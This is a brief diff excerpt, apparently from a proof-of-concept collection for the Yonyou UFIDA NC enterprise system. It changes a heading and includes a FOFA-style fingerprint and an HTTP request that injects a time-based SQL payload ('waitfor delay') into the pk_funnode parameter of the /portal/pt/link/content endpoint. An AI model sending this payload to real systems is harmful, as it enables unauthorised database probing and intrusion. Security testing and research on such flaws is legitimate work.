@@ -8,7 +8,7 @@
 app="用友-UFIDA-NC"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /portal/pt/link/content?pageId=login&pk_funnode=1';waitfor%20delay%20'0:0:0'--&pk_menuitem=2&pageModule=3&pageName=4 HTTP/1.1
